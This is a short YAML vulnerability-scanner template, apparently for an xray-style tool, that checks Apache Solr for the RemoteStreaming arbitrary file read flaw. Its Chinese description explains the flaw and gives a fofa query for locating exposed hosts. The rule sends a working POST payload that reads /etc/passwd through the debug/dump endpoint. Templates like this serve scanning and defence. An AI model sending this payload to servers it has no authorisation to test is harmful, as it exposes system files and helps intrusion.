expression: r0()
id: apache-solr-remotestreaming-anyfileread
info:
  author: daffainfo
  description: "ApacheSolr\u662F\u4E00\u4E2A\u529F\u80FD\u5F3A\u5927\u7684\u5F00\u6E90\
    \u641C\u7D22\u670D\u52A1\u5668\uFF0C\u5B83\u652F\u6301REST\u98CE\u683CAPI\u3002\
    \u5728ApacheSolr\u672A\u5F00\u542F\u8BA4\u8BC1\u7684\u60C5\u51B5\u4E0B\uFF0C\u653B\
    \u51FB\u8005\u53EF\u76F4\u63A5\u6784\u9020\u7279\u5B9A\u8BF7\u6C42\u5F00\u542F\
    \u7279\u5B9A\u914D\u7F6E\uFF0C\u5E76\u6700\u7EC8\u9020\u6210\u4EFB\u610F\u6587\
    \u4EF6\u8BFB\u53D6\u3002\nfofa-query: app=\"APACHE-Solr\"\n"
  name: "Apache Solr RemoteStreaming \u4EFB\u610F\u6587\u4EF6\u8BFB\u53D6"
  reference:
  - https://mp.weixin.qq.com/s/VMZfbUClU8I72pAzzitAOA
  severity: high
  verified: false
rules:
  r0:
    expression: response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
    request:
      body: 'stream.url=file:///etc/passwd

        '
      method: POST
      path: /solr/demo/debug/dump?param=ContentStreams
